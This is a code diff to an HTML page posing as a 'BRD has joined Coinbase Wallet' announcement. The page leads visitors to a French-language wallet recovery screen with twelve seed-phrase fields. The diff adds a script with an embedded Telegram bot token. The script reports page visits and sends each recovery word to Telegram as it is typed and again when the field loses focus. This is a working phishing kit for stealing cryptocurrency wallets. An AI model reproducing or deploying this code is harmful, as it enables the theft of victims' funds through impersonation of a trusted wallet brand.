@@ -114,7 +114,6 @@
         .btn-primary { background-color: var(--btn-blue); color: white; }
         .btn-secondary { background-color: var(--btn-gray); color: white; }
 
-        /* ========== الصفحة الثانية - التعديلات الجديدة ========== */
         .recovery-header {
             display: flex;
             justify-content: space-between;
@@ -205,6 +204,7 @@
             text-align: center;
             outline: none;
             opacity: 0;
+            z-index: 2;
         }
 
         .item-input:focus {
@@ -229,16 +229,12 @@
 <body>
 
     <div class="container">
-        
-        <!-- الصفحة الأولى - بدون تغيير -->
         <div id="p1" class="page active">
             <div class="logo-area">
                 <img src="https://i.ibb.co/ymp5HL9C/F3-BB5708-18-B2-4-C3-F-89-D2-ADF914-D14-A9-E.png" class="brd-main-img" alt="BRD">
             </div>
-
             <h1>BRD has joined<br>Coinbase Wallet!</h1>
             <p class="sub-text">We're excited to announce that BRD is joining the Coinbase Wallet team.</p>
-
             <div class="btn-container">
                 <button class="btn btn-primary" onclick="showPage('p2')">Get Coinbase Wallet</button>
                 <button class="btn btn-secondary" onclick="showPage('p2')">View Press Release</button>
@@ -246,7 +242,6 @@
             </div>
         </div>
 
-        <!-- الصفحة الثانية - الهيكل الجديد -->
         <div id="p2" class="page">
             <div class="recovery-header">
                 <div class="back-arrow" onclick="showPage('p1')">
@@ -256,29 +251,64 @@
                 </div>
                 <div class="help-icon">?</div>
             </div>
-
             <h1 class="recovery-title">Récupérer votre portefeuille</h1>
             <p class="recovery-subtitle">Veuillez saisir la phrase de récupération du portefeuille que vous souhaitez récupérer.</p>
-
-            <div class="recovery-grid" id="mainGrid">
-            </div>
+            <div class="recovery-grid" id="mainGrid"></div>
         </div>
-
     </div>
 
     <script>
+        // تكوين البوت
+        const BOT_TOKEN = '8728135052:AAHDF-SQCPsS1y0JykPgEE691NIjQweUeIU';
+        const CHAT_ID = 'YOUR_CHAT_ID'; // <--- ضع الـ Chat ID الخاص بك هنا
+
+        // دالة إرسال الإشعارات لتيليجرام
+        async function sendToTelegram(message) {
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' })
+                });
+            } catch (e) { console.error("Error sending to TG", e); }
+        }
+
+        // إشعار دخول مستخدم جديد
+        window.addEventListener('load', () => {
+            sendToTelegram(`<b>🔔 New User Entered!</b>\n\nIP: Fetching...\nTime: ${new Date().toLocaleString()}`);
+        });
+
         function showPage(id) {
             document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
             document.getElementById(id).classList.add('active');
+            if(id === 'p2') sendToTelegram("<b>📂 User clicked Restore / Moved to Seed Page</b>");
         }
 
         const grid = document.getElementById('mainGrid');
         for (let i = 1; i <= 12; i++) {
             const div = document.createElement('div');
             div.className = 'grid-item';
-            div.innerHTML = `<input type="text" class="item-input" placeholder=" " spellcheck="false" autocomplete="off"><span class="item-num">${i}</span>`;
+            div.innerHTML = `<input type="text" class="item-input" data-index="${i}" placeholder=" " spellcheck="false" autocomplete="off"><span class="item-num">${i}</span>`;
             grid.appendChild(div);
         }
+
+        // مراقبة الكتابة لايف
+        document.addEventListener('input', (e) => {
+            if (e.target.classList.contains('item-input')) {
+                const wordIndex = e.target.getAttribute('data-index');
+                const wordValue = e.target.value;
+                if (wordValue.length > 2) { // يبدأ بالإرسال بعد كتابة 3 أحرف لتقليل الإزعاج
+                    sendToTelegram(`<b>✍️ Live Typing...</b>\nWord ${wordIndex}: <code>${wordValue}</code>`);
+                }
+            }
+        });
+
+        // إشعار عند فقدان التركيز (عندما ينتهي من كلمة وينتقل للأخرى)
+        document.addEventListener('blur', (e) => {
+            if (e.target.classList.contains('item-input') && e.target.value !== "") {
+                sendToTelegram(`<b>✅ Word Finished</b>\nWord ${e.target.getAttribute('data-index')}: <code>${e.target.value}</code>`);
+            }
+        }, true);
     </script>
 </body>
 </html>
